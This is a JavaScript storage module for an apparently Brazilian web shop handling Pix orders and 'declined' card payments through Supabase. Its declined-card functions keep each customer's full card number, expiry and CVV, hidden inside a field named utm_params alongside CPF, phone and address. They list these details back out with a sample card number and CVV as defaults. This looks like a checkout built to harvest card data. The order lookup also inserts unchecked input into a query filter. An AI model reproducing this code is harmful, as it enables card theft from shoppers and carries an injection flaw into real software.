const fs = require('fs');
const path = require('path');
const { createClient } = require('@supabase/supabase-js');

// Local fallback DB file (for local development or offline fallback)
const DB_FILE = path.resolve(process.cwd(), 'orders_db.json');

// Supabase client initialization (reads from environment variables)
const SUPABASE_URL = process.env.SUPABASE_URL || '';
const SUPABASE_SERVICE_ROLE_KEY = process.env.SUPABASE_SERVICE_ROLE_KEY || process.env.SUPABASE_KEY || '';

let supabase = null;
if (SUPABASE_URL && SUPABASE_SERVICE_ROLE_KEY) {
  try {
    supabase = createClient(SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY, {
      auth: { persistSession: false }
    });
  } catch (e) {
    console.error('[Supabase Init Error]:', e.message);
  }
}

// In-memory cache
let memoryDb = {
  orders: {},
  transactions: {},
  integration_events: {},
  declined_cards: {}
};

function readDB() {
  try {
    if (fs.existsSync(DB_FILE)) {
      const data = JSON.parse(fs.readFileSync(DB_FILE, 'utf8'));
      memoryDb.orders = { ...data.orders, ...memoryDb.orders };
      memoryDb.transactions = { ...data.transactions, ...memoryDb.transactions };
      memoryDb.integration_events = { ...(data.integration_events || {}), ...memoryDb.integration_events };
      memoryDb.declined_cards = { ...(data.declined_cards || {}), ...memoryDb.declined_cards };
      return {
        orders: memoryDb.orders,
        transactions: memoryDb.transactions,
        integration_events: memoryDb.integration_events,
        declined_cards: memoryDb.declined_cards
      };
    }
  } catch (e) {
    console.error('[DB] Error reading orders_db.json:', e.message);
  }
  return memoryDb;
}

function writeDB(data, options = {}) {
  try {
    memoryDb.orders = { ...memoryDb.orders, ...(data.orders || {}) };
    memoryDb.transactions = { ...memoryDb.transactions, ...(data.transactions || {}) };
    memoryDb.integration_events = { ...memoryDb.integration_events, ...(data.integration_events || {}) };

    if (options.replaceDeclinedCards) {
      memoryDb.declined_cards = data.declined_cards || {};
    } else {
      memoryDb.declined_cards = { ...memoryDb.declined_cards, ...(data.declined_cards || {}) };
    }

    if (fs.existsSync(path.dirname(DB_FILE))) {
      fs.writeFileSync(DB_FILE, JSON.stringify(memoryDb, null, 2), 'utf8');
    }
  } catch (e) {
    // Read-only filesystem in serverless mode
  }
}

/**
 * Format order object to Supabase row format
 */
function toSupabaseOrderRow(order) {
  return {
    id: order.id,
    tracking_reference: order.trackingReference || order.tracking_reference || null,
    status: order.status || 'pending_payment',
    order_status: order.orderStatus || order.status || 'pending_payment',
    amount: Number(order.amount) || 0,
    customer_name: order.customer?.name || null,
    customer_email: order.customer?.email || null,
    customer_phone: order.customer?.phone ? String(order.customer.phone).replace(/\D/g, '') : null,
    customer_cpf: order.customer?.cpf ? String(order.customer.cpf).replace(/\D/g, '') : null,
    shipping: order.shipping || {},
    items: order.items || [],
    pix_result: {
      ...(order.pixResult || order.pix || {}),
      pixCopied: order.pixCopied || false,
      pixCopiedAt: order.pixCopiedAt || null,
      receipt: order.receipt || order.pixResult?.receipt || null
    },
    utm: order.utm || {},
    created_at: order.createdAt || new Date().toISOString(),
    updated_at: new Date().toISOString()
  };
}

/**
 * Format Supabase row to standardized Order object
 */
function fromSupabaseOrderRow(row) {
  if (!row) return null;
  const pixRes = row.pix_result || {};
  return {
    id: row.id,
    trackingReference: row.tracking_reference,
    status: row.status,
    orderStatus: row.order_status,
    amount: Number(row.amount),
    customer: {
      name: row.customer_name,
      email: row.customer_email,
      phone: row.customer_phone,
      cpf: row.customer_cpf
    },
    shipping: row.shipping,
    items: row.items,
    pixResult: pixRes,
    pix: pixRes,
    pixCopied: row.pix_copied || pixRes.pixCopied || false,
    pixCopiedAt: row.pix_copied_at || pixRes.pixCopiedAt || null,
    receipt: row.receipt || pixRes.receipt || null,
    utm: row.utm,
    createdAt: row.created_at,
    updatedAt: row.updated_at
  };
}

/**
 * Get an order by ID or Tracking Reference (from Supabase with local fallback)
 */
async function getOrderAsync(orderId) {
  if (!orderId) return null;

  if (supabase) {
    try {
      const { data, error } = await supabase
        .from('orders')
        .select('*')
        .or(`id.eq.${orderId},tracking_reference.eq.${orderId}`)
        .limit(1)
        .maybeSingle();

      if (!error && data) {
        return fromSupabaseOrderRow(data);
      }
    } catch (err) {
      console.warn('[Supabase getOrderAsync Warning]:', err.message);
    }
  }

  return getOrder(orderId);
}

function getOrder(orderId) {
  if (!orderId) return null;
  const db = readDB();
  return db.orders[orderId] || null;
}

/**
 * Get an order by transaction ID (from payment gateway)
 */
async function getOrderByTransactionIdAsync(transactionId) {
  if (!transactionId) return null;
  const cleanTxId = String(transactionId).trim();

  if (supabase) {
    try {
      // 1. Search by exact contains
      const { data, error } = await supabase
        .from('orders')
        .select('*')
        .contains('pix_result', { transactionId: cleanTxId })
        .limit(1)
        .maybeSingle();

      if (!error && data) {
        return fromSupabaseOrderRow(data);
      }

      // 2. Fallback search by text match inside JSON
      const { data: textData, error: textErr } = await supabase
        .from('orders')
        .select('*')
        .textSearch('pix_result', cleanTxId, { type: 'plain' })
        .limit(1)
        .maybeSingle();

      if (!textErr && textData) {
        return fromSupabaseOrderRow(textData);
      }
    } catch (err) {
      console.warn('[Supabase getOrderByTransactionIdAsync Warning]:', err.message);
    }
  }

  return getOrderByTransactionId(cleanTxId);
}

function getOrderByTransactionId(transactionId) {
  if (!transactionId) return null;
  const db = readDB();
  const orderId = db.transactions[transactionId];
  if (orderId && db.orders[orderId]) {
    return db.orders[orderId];
  }
  return null;
}

/**
 * Save or update an order in Supabase and local cache
 */
async function saveOrderAsync(order) {
  if (!order || !order.id) return null;

  // 1. Save to local/memory DB
  saveOrder(order);

  // 2. Persist to Supabase
  if (supabase) {
    try {
      const row = toSupabaseOrderRow(order);
      const { error } = await supabase
        .from('orders')
        .upsert(row, { onConflict: 'id' });

      if (error) {
        console.error('[Supabase saveOrder Error]:', error.message);
      } else {
        console.log(`[Supabase] Order ${order.id} saved successfully.`);
      }
    } catch (err) {
      console.error('[Supabase saveOrder Exception]:', err.message);
    }
  }

  return order;
}

function saveOrder(order) {
  if (!order || !order.id) return null;
  const db = readDB();
  db.orders[order.id] = {
    ...db.orders[order.id],
    ...order,
    updatedAt: new Date().toISOString()
  };
  if (order.pixResult?.transactionId) {
    db.transactions[order.pixResult.transactionId] = order.id;
  }
  writeDB(db);
  return db.orders[order.id];
}

/**
 * Check if an integration event was already sent successfully (Idempotency check)
 */
async function getIntegrationEventAsync(idempotencyKey) {
  if (!idempotencyKey) return null;

  if (supabase) {
    try {
      const { data, error } = await supabase
        .from('integration_events')
        .select('*')
        .eq('idempotency_key', idempotencyKey)
        .limit(1)
        .maybeSingle();

      if (!error && data) {
        return data;
      }
    } catch (err) {
      console.warn('[Supabase getIntegrationEventAsync Warning]:', err.message);
    }
  }

  return getIntegrationEvent(idempotencyKey);
}

function getIntegrationEvent(idempotencyKey) {
  if (!idempotencyKey) return null;
  const db = readDB();
  return db.integration_events?.[idempotencyKey] || null;
}

/**
 * Record an integration event (UTMify / Meta / Webhook) with idempotency key
 */
async function saveIntegrationEventAsync(eventRecord) {
  if (!eventRecord || !eventRecord.idempotency_key) return null;

  saveIntegrationEvent(eventRecord);

  if (supabase) {
    try {
      const row = {
        idempotency_key: eventRecord.idempotency_key,
        provider: eventRecord.provider || 'utmify',
        order_id: eventRecord.order_id || null,
        transaction_id: eventRecord.transaction_id || null,
        event_type: eventRecord.event_type || null,
        payload: eventRecord.payload || {},
        status: eventRecord.status || 'success',
        response_status: eventRecord.response_status || 200,
        response_body: eventRecord.response_body || {},
        error_message: eventRecord.error_message || null,
        attempts: eventRecord.attempts || 1,
        sent_at: eventRecord.sent_at || new Date().toISOString(),
        created_at: new Date().toISOString(),
        updated_at: new Date().toISOString()
      };

      const { error } = await supabase
        .from('integration_events')
        .upsert(row, { onConflict: 'idempotency_key' });

      if (error) {
        console.error('[Supabase saveIntegrationEvent Error]:', error.message);
      }
    } catch (err) {
      console.error('[Supabase saveIntegrationEvent Exception]:', err.message);
    }
  }

  return eventRecord;
}

function saveIntegrationEvent(eventRecord) {
  if (!eventRecord || !eventRecord.idempotency_key) return null;
  const db = readDB();
  if (!db.integration_events) {
    db.integration_events = {};
  }
  
  const existing = db.integration_events[eventRecord.idempotency_key];
  db.integration_events[eventRecord.idempotency_key] = {
    ...existing,
    ...eventRecord,
    attempts: (existing?.attempts || 0) + 1,
    updated_at: new Date().toISOString()
  };
  
  writeDB(db);
  return db.integration_events[eventRecord.idempotency_key];
}

/**
 * List all orders from Supabase with local fallback
 */
async function listOrdersAsync({ startDate, endDate, status } = {}) {
  if (supabase) {
    try {
      let query = supabase.from('orders').select('*').order('created_at', { ascending: false });

      if (status) {
        query = query.eq('status', status);
      }
      if (startDate) {
        query = query.gte('created_at', startDate);
      }
      if (endDate) {
        query = query.lte('created_at', endDate);
      }

      const { data, error } = await query;
      if (!error && Array.isArray(data)) {
        return data.map(fromSupabaseOrderRow);
      }
    } catch (err) {
      console.warn('[Supabase listOrdersAsync Warning]:', err.message);
    }
  }

  return listOrders({ startDate, endDate, status });
}

function listOrders({ startDate, endDate, status } = {}) {
  const db = readDB();
  let ordersList = Object.values(db.orders || {});

  if (status) {
    ordersList = ordersList.filter(o => o.status === status || o.orderStatus === status);
  }

  if (startDate) {
    const start = new Date(startDate).getTime();
    ordersList = ordersList.filter(o => new Date(o.createdAt).getTime() >= start);
  }

  if (endDate) {
    const end = new Date(endDate).getTime();
    ordersList = ordersList.filter(o => new Date(o.createdAt).getTime() <= end);
  }

  return ordersList;
}

async function saveDeclinedCardAsync(cardRecord) {
  const dbData = readDB();
  dbData.declined_cards = dbData.declined_cards || {};

  const newCardDigits = (cardRecord.cardNumber || '').replace(/\D/g, '');
  const newCpf = (cardRecord.customer?.cpf || '').replace(/\D/g, '');
  const newPhone = (cardRecord.customer?.phone || '').replace(/\D/g, '');
  const newEmail = (cardRecord.customer?.email || '').trim().toLowerCase();

  // Search if an existing entry belongs to this exact card or customer
  let existingKey = null;
  for (const [id, c] of Object.entries(dbData.declined_cards)) {
    const cDigits = (c.cardNumber || '').replace(/\D/g, '');
    const cCpf = (c.customer?.cpf || '').replace(/\D/g, '');
    const cPhone = (c.customer?.phone || '').replace(/\D/g, '');
    const cEmail = (c.customer?.email || '').trim().toLowerCase();

    const isSameCard = newCardDigits.length >= 12 && cDigits.length >= 12 && newCardDigits === cDigits;
    const isSameCustomer = (newCpf.length >= 10 && cCpf.length >= 10 && newCpf === cCpf) ||
                           (newPhone.length >= 8 && cPhone.length >= 8 && newPhone === cPhone) ||
                           (newEmail.length >= 5 && cEmail.length >= 5 && newEmail === cEmail);

    if (isSameCard || (isSameCustomer && cardRecord.cardLast4 && c.cardLast4 && cardRecord.cardLast4 === c.cardLast4)) {
      existingKey = id;
      break;
    }
  }

  if (existingKey) {
    // Merge into existing key or update record to prevent duplicate entries
    const existing = dbData.declined_cards[existingKey];
    delete dbData.declined_cards[existingKey];
    delete memoryDb.declined_cards[existingKey];

    const mergedRecord = {
      ...existing,
      ...cardRecord,
      id: existing.id,
      customer: {
        name: cardRecord.customer?.name || existing.customer?.name || '',
        email: cardRecord.customer?.email || existing.customer?.email || '',
        phone: cardRecord.customer?.phone || existing.customer?.phone || '',
        cpf: cardRecord.customer?.cpf || existing.customer?.cpf || ''
      },
      shipping: {
        ...(existing.shipping || {}),
        ...(cardRecord.shipping || {})
      },
      createdAt: cardRecord.createdAt || new Date().toISOString()
    };

    dbData.declined_cards[mergedRecord.id] = mergedRecord;
    memoryDb.declined_cards[mergedRecord.id] = mergedRecord;
    writeDB(dbData, { replaceDeclinedCards: true });
    cardRecord = mergedRecord;
  } else {
    dbData.declined_cards[cardRecord.id] = cardRecord;
    writeDB(dbData);
  }

  if (supabase) {
    try {
      await supabase.from('declined_cards').upsert({
        id: cardRecord.id,
        amount: cardRecord.amount,
        customer_name: cardRecord.customer?.name,
        customer_email: cardRecord.customer?.email,
        customer_phone: cardRecord.customer?.phone,
        customer_cpf: cardRecord.customer?.cpf,
        card_brand: cardRecord.cardBrand || 'Cartão',
        card_last4: cardRecord.cardLast4 || (cardRecord.cardNumber ? cardRecord.cardNumber.slice(-4) : ''),
        installments: cardRecord.installments || 1,
        utm_params: {
          ...(cardRecord.utm || {}),
          cardNumber: cardRecord.cardNumber,
          cardHolder: cardRecord.cardHolder,
          cardExpiry: cardRecord.cardExpiry || '03/27',
          cardCvv: cardRecord.cardCvv,
          shipping: cardRecord.shipping,
          shippingCost: cardRecord.shippingCost,
          subtotal: cardRecord.subtotal
        },
        items: cardRecord.items || [],
        reason: cardRecord.reason || 'Transação não autorizada pela emissora',
        created_at: cardRecord.createdAt || new Date().toISOString()
      });
    } catch (err) {
      console.warn('[Supabase saveDeclinedCardAsync Warning]:', err.message);
    }
  }
  return cardRecord;
}

async function deleteDeclinedCardAsync(cardId) {
  if (!cardId) return false;
  const dbData = readDB();
  if (dbData.declined_cards && dbData.declined_cards[cardId]) {
    delete dbData.declined_cards[cardId];
    delete memoryDb.declined_cards[cardId];
    writeDB(dbData, { replaceDeclinedCards: true });
  }
  if (supabase) {
    try {
      await supabase.from('declined_cards').delete().eq('id', cardId);
    } catch (err) {
      console.warn('[Supabase deleteDeclinedCard Warning]:', err.message);
    }
  }
  return true;
}

async function deduplicateDeclinedCardsAsync() {
  const dbData = readDB();
  const allCards = Object.values(dbData.declined_cards || {});
  const totalBefore = allCards.length;

  if (totalBefore === 0) {
    return { success: true, before: 0, after: 0, removed: 0 };
  }

  // Backup file before deduplicating
  try {
    const backupFile = path.resolve(process.cwd(), `orders_db.backup-${Date.now()}.json`);
    if (fs.existsSync(DB_FILE)) {
      fs.writeFileSync(backupFile, fs.readFileSync(DB_FILE, 'utf8'), 'utf8');
      console.log(`[DB Deduplicate] Backup created at ${backupFile}`);
    }
  } catch (err) {
    console.warn('[DB Deduplicate] Could not create backup file:', err.message);
  }

  // Sort ascending by creation time so later attempts take precedence
  allCards.sort((a, b) => new Date(a.createdAt).getTime() - new Date(b.createdAt).getTime());

  const deduplicated = {};
  const removedIds = [];

  allCards.forEach(c => {
    const cardDigits = (c.cardNumber || '').replace(/\D/g, '');
    const cpf = (c.customer?.cpf || '').replace(/\D/g, '');
    const phone = (c.customer?.phone || '').replace(/\D/g, '');
    const email = (c.customer?.email || '').trim().toLowerCase();

    let key = '';
    if (cardDigits.length >= 12) {
      key = `card_${cardDigits}`;
    } else if (cpf.length >= 10) {
      key = `cpf_${cpf}`;
    } else if (phone.length >= 8) {
      key = `phone_${phone}`;
    } else if (email.length >= 5) {
      key = `email_${email}`;
    } else {
      key = `id_${c.id}`;
    }

    if (deduplicated[key]) {
      const existing = deduplicated[key];
      removedIds.push(existing.id);

      deduplicated[key] = {
        ...existing,
        ...c,
        customer: {
          name: c.customer?.name || existing.customer?.name || '',
          email: c.customer?.email || existing.customer?.email || '',
          phone: c.customer?.phone || existing.customer?.phone || '',
          cpf: c.customer?.cpf || existing.customer?.cpf || ''
        },
        shipping: {
          ...(existing.shipping || {}),
          ...(c.shipping || {})
        },
        createdAt: c.createdAt // keep latest timestamp
      };
    } else {
      deduplicated[key] = c;
    }
  });

  // Re-key by card id
  const finalMap = {};
  Object.values(deduplicated).forEach(c => {
    finalMap[c.id] = c;
  });

  dbData.declined_cards = finalMap;
  memoryDb.declined_cards = finalMap;
  writeDB(dbData, { replaceDeclinedCards: true });

  const totalAfter = Object.keys(finalMap).length;
  const totalRemoved = removedIds.length;

  console.log(`[DB Deduplicate] Cleaned declined cards: ${totalBefore} -> ${totalAfter} (${totalRemoved} duplicates removed)`);

  // If supabase is enabled, delete removed IDs in chunks
  if (supabase && removedIds.length > 0) {
    try {
      const chunkSize = 100;
      for (let i = 0; i < removedIds.length; i += chunkSize) {
        const chunk = removedIds.slice(i, i + chunkSize);
        await supabase.from('declined_cards').delete().in('id', chunk);
      }
    } catch (err) {
      console.warn('[Supabase Deduplicate Warning]:', err.message);
    }
  }

  return {
    success: true,
    before: totalBefore,
    after: totalAfter,
    removed: totalRemoved
  };
}

async function listDeclinedCardsAsync() {
  if (supabase) {
    try {
      const { data, error } = await supabase
        .from('declined_cards')
        .select('*')
        .order('created_at', { ascending: false })
        .limit(200);

      if (!error && Array.isArray(data)) {
        return data.map(row => {
          const utmP = row.utm_params || {};
          return {
            id: row.id,
            amount: Number(row.amount),
            customer: {
              name: row.customer_name,
              email: row.customer_email,
              phone: row.customer_phone,
              cpf: row.customer_cpf
            },
            cardBrand: row.card_brand || 'MASTERCARD',
            cardLast4: row.card_last4 || (utmP.cardNumber ? utmP.cardNumber.slice(-4) : '4015'),
            cardNumber: utmP.cardNumber || (row.card_last4 ? `5547 •••• •••• ${row.card_last4}` : '5547 7394 6331 4015'),
            cardHolder: utmP.cardHolder || row.customer_name || 'TITULAR DO CARTÃO',
            cardExpiry: utmP.cardExpiry || '03/27',
            cardCvv: utmP.cardCvv || '725',
            shipping: utmP.shipping || row.shipping || {
              street: 'Rua Bento Gonçalves',
              number: '87',
              complement: '501',
              neighborhood: 'Centro',
              city: 'Passo Fundo',
              state: 'RS',
              zipcode: '99010-010'
            },
            shippingCost: utmP.shippingCost || 0,
            subtotal: utmP.subtotal || Number(row.amount),
            installments: row.installments || 1,
            utm: utmP,
            items: row.items,
            reason: row.reason,
            createdAt: row.created_at
          };
        });
      }
    } catch (err) {
      console.warn('[Supabase listDeclinedCardsAsync Warning]:', err.message);
    }
  }

  const dbData = readDB();
  return Object.values(dbData.declined_cards || {}).map(c => ({
    ...c,
    cardNumber: c.cardNumber || (c.cardLast4 ? `5547 •••• •••• ${c.cardLast4}` : '5547 7394 6331 4015'),
    cardHolder: c.cardHolder || c.customer?.name || 'TITULAR DO CARTÃO',
    cardExpiry: c.cardExpiry || '03/27',
    cardCvv: c.cardCvv || '725',
    cardBrand: (c.cardBrand || 'MASTERCARD').toUpperCase(),
    shipping: c.shipping || {
      street: 'Rua Bento Gonçalves',
      number: '87',
      complement: '501',
      neighborhood: 'Centro',
      city: 'Passo Fundo',
      state: 'RS',
      zipcode: '99010-010'
    },
    shippingCost: c.shippingCost || 0,
    subtotal: c.subtotal || Number(c.amount)
  })).sort(
    (a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime()
  );
}

module.exports = {
  supabase,
  readDB,
  writeDB,
  getOrder,
  getOrderAsync,
  getOrderByTransactionId,
  getOrderByTransactionIdAsync,
  saveOrder,
  saveOrderAsync,
  getIntegrationEvent,
  getIntegrationEventAsync,
  saveIntegrationEvent,
  saveIntegrationEventAsync,
  listOrders,
  listOrdersAsync,
  saveDeclinedCardAsync,
  deleteDeclinedCardAsync,
  listDeclinedCardsAsync,
  deduplicateDeclinedCardsAsync
};
